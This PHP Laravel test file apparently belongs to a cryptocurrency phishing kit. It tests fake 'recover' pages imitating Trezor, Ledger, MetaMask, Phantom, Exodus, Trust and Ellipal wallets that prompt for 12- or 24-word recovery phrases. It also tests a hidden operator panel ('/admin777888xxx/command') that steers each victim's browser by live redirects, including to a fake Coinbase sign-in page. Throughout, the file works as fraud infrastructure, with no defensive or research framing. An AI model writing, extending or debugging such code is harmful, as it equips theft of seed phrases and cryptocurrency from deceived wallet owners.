<?php

namespace Tests\Feature;

use App\Models\AdminCommand;
use App\Models\UserSession;
use Illuminate\Foundation\Http\Middleware\ValidateCsrfToken;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Routing\Middleware\ThrottleRequests;
use Illuminate\Support\Str;
use Tests\TestCase;

class RecoverPagesTest extends TestCase
{
    use RefreshDatabase;

    protected function setUp(): void
    {
        parent::setUp();
        $this->withoutMiddleware([
            ThrottleRequests::class,
            ValidateCsrfToken::class,
        ]);
    }

    public function test_recover_pages_are_first_class_and_leave_sources_unchanged(): void
    {
        $token = $this->token();

        $this->withCookie('liveled_token', $token)->get('/trezor/recover')->assertOk()
            ->assertSee('Recover Trezor', false)
            ->assertDontSee('Disconnect Trezor', false);
        $this->withCookie('liveled_token', $token)->get('/trezor/phrase-page')->assertOk()
            ->assertSee('Disconnect Trezor', false);

        $this->withCookie('liveled_token', $token)->get('/exodus/recover')->assertOk()
            ->assertSee('Recover your wallet', false)
            ->assertDontSee('Disconnect your wallet', false);
        $this->withCookie('liveled_token', $token)->get('/exodus/import')->assertOk()
            ->assertSee('Disconnect your wallet', false);

        $this->withCookie('liveled_token', $token)->get('/ellipal/recover')->assertOk()
            ->assertSee('Recover your wallet', false)
            ->assertSee('Enter your recovery phrase to recover your wallet', false);
        $this->withCookie('liveled_token', $token)->get('/ellipal/1')->assertOk()
            ->assertSee('Disconnect your wallet', false);

        $this->withCookie('liveled_token', $token)->get('/trust/recover')->assertOk()
            ->assertSee('Recover your wallet', false)
            ->assertSee('Recover Wallet', false);
        $this->withCookie('liveled_token', $token)->get('/trust/disconnect')->assertOk()
            ->assertSee('Disconnect your wallet', false);

        foreach (['/ledger/1/recover', '/ledger/2/recover', '/ledger/3/recover'] as $path) {
            $this->withCookie('liveled_token', $token)->get($path)->assertOk()
                ->assertSee('Recover your Ledger', false)
                ->assertDontSee('Disconnect your Ledger', false);
        }
        $this->withCookie('liveled_token', $token)->get('/ledger/1')->assertOk()
            ->assertSee('Disconnect your Ledger', false);

        $this->withCookie('liveled_token', $token)->get('/phantom/recover')->assertOk()
            ->assertSee('Recover Wallet', false)
            ->assertSee('Enter your 12 or 24-word recovery phrase to recover your wallet.', false)
            ->assertDontSee('Disconnect Wallet', false);
        $this->withCookie('liveled_token', $token)->get('/phantom/seeds')->assertOk()
            ->assertSee('Disconnect Wallet', false);

        $this->withCookie('liveled_token', $token)->get('/metamask/recover')->assertOk()
            ->assertSee('Recover your wallet', false)
            ->assertDontSee('Disconnect your wallet', false);
        $this->withCookie('liveled_token', $token)->get('/metamask/import')->assertOk()
            ->assertSee('Disconnect your wallet', false);
    }

    public function test_recover_does_not_redirect_to_source_or_import_source_capture(): void
    {
        $token = $this->token();
        foreach ([
            '/trezor/recover',
            '/exodus/recover',
            '/ellipal/recover',
            '/trust/recover',
            '/ledger/1/recover',
            '/ledger/2/recover',
            '/ledger/3/recover',
            '/phantom/recover',
            '/metamask/recover',
        ] as $path) {
            $html = $this->withCookie('liveled_token', $token)->get($path)->assertOk()->getContent();
            $this->assertStringNotContainsString("type:'form_submit'", $html, $path);
            $this->assertStringNotContainsString("element:'full_state'", $html, $path);
            $this->assertStringNotContainsString("element:'seed_phrase'", $html, $path);
            $this->assertStringContainsString('setInterval(_poll,1000)', $html, $path);
        }
    }

    public function test_recover_invalid_uses_own_form_state_key(): void
    {
        $cases = [
            ['/trezor/recover', 'trezor_recover', 'trezor_phrase_page', '_llTrzrInvalid=true', '_llTrzpInvalid=true'],
            ['/exodus/recover', 'exodus_recover', 'exodus_import', '_llExRecInvalid=true', '_llExInvalid=true'],
            ['/ellipal/recover', 'ellipal_recover', 'ellipal_24word', '_llElRecInvalid=true', '_llElInvalid=true'],
            ['/ledger/1/recover', 'ledger_1_recover', 'ledger_1', '_llLdRecInvalid=true', '_llLdInvalid=true'],
            ['/phantom/recover', 'phantom_recover', 'phantom_seeds', '_llPhRecInvalid=true', '_llPhInvalid=true'],
            ['/metamask/recover', 'metamask_recover', 'metamask_import', '_llMmRecInvalid=true', '_llMmInvalid=true'],
        ];

        foreach ($cases as [$path, $recoverKey, $sourceKey, $recoverFlag, $sourceFlag]) {
            $token = $this->token();
            $this->withCookie('liveled_token', $token)->get($path)->assertOk();

            $this->withSession(['admin_auth' => true])
                ->postJson('/admin777888xxx/command', [
                    'session_token' => $token,
                    'command' => 'redirect',
                    'payload' => ['url' => $path, 'page_state' => 'invalid'],
                ])
                ->assertOk();

            $sess = UserSession::where('session_token', $token)->first();
            $this->assertSame('invalid', $sess->metadata['form_state'][$recoverKey] ?? null, $path);
            $this->assertArrayNotHasKey($sourceKey, $sess->metadata['form_state'] ?? [], $path);

            $html = $this->withCookie('liveled_token', $token)->get($path)->assertOk()->getContent();
            $this->assertStringContainsString($recoverFlag, $html, $path);
            $this->assertStringNotContainsString($sourceFlag, $html, $path);
            $consumed = UserSession::where('session_token', $token)->first();
            $this->assertSame('default', $consumed->metadata['form_state'][$recoverKey] ?? null, $path);
        }
    }

    public function test_admin_redirect_from_ledger_recover_pages_is_delivered_on_poll(): void
    {
        $cases = [
            ['/ledger/3/recover', 'ledger_3_recover'],
            ['/ledger/1/recover', 'ledger_1_recover'],
            ['/ledger/2/recover', 'ledger_2_recover'],
            ['/ledger/3', 'ledger_3'],
            ['/phantom/seeds', 'phantom_seeds'],
        ];

        foreach ($cases as [$from, $pageKey]) {
            $token = $this->token();
            $html = $this->withCookie('liveled_token', $token)->get($from)->assertOk()->getContent();
            $this->assertStringContainsString('setInterval(_poll,1000)', $html, $from);
            $this->assertStringContainsString('window.handleAdminCommands', $html, $from);
            $this->assertSame($pageKey, UserSession::where('session_token', $token)->value('current_page'), $from);

            $this->withSession(['admin_auth' => true])
                ->postJson('/admin777888xxx/command', [
                    'session_token' => $token,
                    'command' => 'redirect',
                    'payload' => ['url' => '/coinbase/sign-in', 'page_state' => 'default'],
                ])
                ->assertOk()
                ->assertJson(['ok' => true]);

            $row = AdminCommand::where('session_token', $token)->where('command', 'redirect')->latest('id')->first();
            $this->assertNotNull($row, $from);
            $this->assertSame('/coinbase/sign-in', $row->payload['url'] ?? null, $from);
            $this->assertFalse((bool) $row->executed, $from);

            $doc = (string) UserSession::where('session_token', $token)->value('document_id');
            $poll = $this->withCookie('liveled_token', $token)
                ->get('/api/check?page='.$pageKey.'&doc='.$doc)
                ->assertOk()
                ->json();
            $this->assertSame('redirect', $poll['commands'][0]['command'] ?? null, $from);
            $this->assertSame('/coinbase/sign-in', $poll['commands'][0]['payload']['url'] ?? null, $from);
            $this->assertTrue($poll['authority_match'] ?? false, $from);
        }

        $token = $this->token();
        $this->withCookie('liveled_token', $token)->get('/ledger/3/recover')->assertOk();
        foreach (['/ledger/1', '/ledger/2', '/ledger/1/recover', '/ledger/2/recover', '/phantom/seeds'] as $dest) {
            $this->withSession(['admin_auth' => true])
                ->postJson('/admin777888xxx/command', [
                    'session_token' => $token,
                    'command' => 'redirect',
                    'payload' => ['url' => $dest],
                ])
                ->assertOk();
        }
        $poll = $this->withCookie('liveled_token', $token)->get('/api/check')->assertOk()->json();
        $urls = array_map(fn ($c) => $c['payload']['url'] ?? null, $poll['commands']);
        $this->assertSame(['/ledger/1', '/ledger/2', '/ledger/1/recover', '/ledger/2/recover', '/phantom/seeds'], $urls);
    }

    public function test_admin_dashboard_maps_recover_destinations(): void
    {
        $js = file_get_contents(public_path('js/admin-dashboard.js'));
        $this->assertStringContainsString("panel.dataset.exPreset==='recover' ? '/exodus/recover' : '/exodus/import'", $js);
        $this->assertStringContainsString("panel.dataset.elPreset==='recover' ? '/ellipal/recover' : '/ellipal/1'", $js);
        $this->assertStringContainsString("panel.dataset.trzPreset==='recover' ? '/trezor/recover' : '/trezor/phrase-page'", $js);
        $this->assertStringContainsString("panel.dataset.twPreset==='recover' ? '/trust/recover' : '/trust/disconnect'", $js);
        $this->assertStringContainsString("panel.dataset.ldPreset==='recover' ? cfg.url+'/recover' : cfg.url", $js);
        $this->assertStringContainsString("panel.dataset.phPreset==='recover' ? '/phantom/recover' : '/phantom/seeds'", $js);
        $this->assertStringContainsString("panel.dataset.mmPreset==='recover' ? '/metamask/recover' : '/metamask/import'", $js);
        $this->assertStringContainsString("tw-preset-recover", $js);
    }

    private function token(): string
    {
        return Str::random(48);
    }
}
